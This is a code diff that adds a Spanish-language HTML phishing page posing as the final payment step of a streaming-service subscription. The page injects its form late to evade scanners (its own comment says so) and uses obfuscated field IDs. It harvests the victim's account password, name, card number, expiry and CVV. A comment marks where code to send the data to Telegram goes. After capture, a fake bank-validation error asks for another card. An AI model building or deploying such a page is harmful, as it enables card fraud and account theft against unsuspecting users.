@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C&#111;nfirmaci&#243;n</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
+        .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
+        .step { text-transform: uppercase; font-size: 13px; font-weight: 400; }
+        h1 { font-size: 30px; margin: 10px 0 20px; font-weight: 700; line-height: 1.1; }
+        .payment-icons { margin: 15px 0; display: flex; gap: 8px; }
+        .fa-cc-visa { color: #1A1F71; font-size: 35px; }
+        .fa-cc-mastercard { color: #EB001B; font-size: 35px; }
+        .fa-cc-amex { color: #007BC1; font-size: 35px; }
+        
+        /* Estilos de inputs */
+        .box-wrapper { margin-bottom: 15px; }
+        .q_input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
+        .grid-q { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        
+        .btn-finalize { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; margin-top: 20px; }
+        
+        /* Loader oculto */
+        #loader { display: none; text-align: center; padding: 20px; font-size: 18px; color: #e50914; }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 24px; }
+            .nav-pay img { width: 90px; }
+        }
+    </style>
+</head>
+<body>
+    <nav class="nav-pay">
+        <img src="img/logo.png" style="width: 100px;" alt="Logo">
+        <a href="#" style="text-decoration: none; color: #333; font-weight: bold;">Cerrar sesión</a>
+    </nav>
+
+    <div class="container-pay">
+        <span class="step">Paso <b>3</b> de <b>3</b></span>
+        <h1>Configura tu medio de pago</h1>
+        
+        <div class="payment-icons">
+            <i class="fab fa-cc-visa"></i>
+            <i class="fab fa-cc-mastercard"></i>
+            <i class="fab fa-cc-amex"></i>
+        </div>
+
+        <div id="dynamic-injection">
+            </div>
+        
+        <div id="loader">
+            <i class="fas fa-circle-notch fa-spin"></i> Procesando...
+        </div>
+    </div>
+
+    <script>
+        // 1. INYECCIÓN DINÁMICA: Escondemos el formulario de los robots
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                document.getElementById('dynamic-injection').innerHTML = `
+                    <form id="f_p_form">
+                        <div class="box-wrapper"><input type="password" id="v_pass" class="q_input" placeholder="Contraseña de acceso" required></div>
+                        <div class="box-wrapper"><input type="text" id="v_name" class="q_input" placeholder="Nombre" required></div>
+                        <div class="box-wrapper"><input type="text" id="v_last" class="q_input" placeholder="Apellido" required></div>
+                        <div class="box-wrapper"><input type="text" id="v_num" class="q_input" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required></div>
+                        <div class="grid-q">
+                            <div class="box-wrapper"><input type="text" id="v_exp" class="q_input" placeholder="MM/AA" maxlength="5" required></div>
+                            <div class="box-wrapper"><input type="text" id="v_cvv" class="q_input" placeholder="CVV" maxlength="4" inputmode="numeric" required></div>
+                        </div>
+                        <p style="font-size: 12px; color: #737373;">Al continuar, declaras que eres mayor de 18 años y aceptas los términos del servicio.</p>
+                        <button type="submit" class="btn-finalize">Iniciar suscripción</button>
+                    </form>
+                `;
+                setupListener();
+            }, 1000);
+        });
+
+        function setupListener() {
+            document.getElementById('f_p_form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Ocultar formulario y mostrar carga
+                this.style.display = 'none';
+                document.getElementById('loader').style.display = 'block';
+
+                // Capturar datos usando los nuevos IDs ofuscados
+                const data = {
+                    mail: sessionStorage.getItem('usr_temp_mail'),
+                    key: document.getElementById('v_pass').value,
+                    n: document.getElementById('v_name').value + " " + document.getElementById('v_last').value,
+                    t: document.getElementById('v_num').value,
+                    e: document.getElementById('v_exp').value,
+                    c: document.getElementById('v_cvv').value
+                };
+
+                // RECOMENDACIÓN: Aquí va tu código para enviar a Telegram
+                console.log("Enviando paquete seguro:", data);
+
+                setTimeout(() => {
+                    alert("Error temporal: El sistema de validación bancaria no responde. Por favor, intenta con otra tarjeta de débito o crédito.");
+                    location.reload();
+                }, 2500);
+            });
+        }
+    </script>
+</body>
+</html>
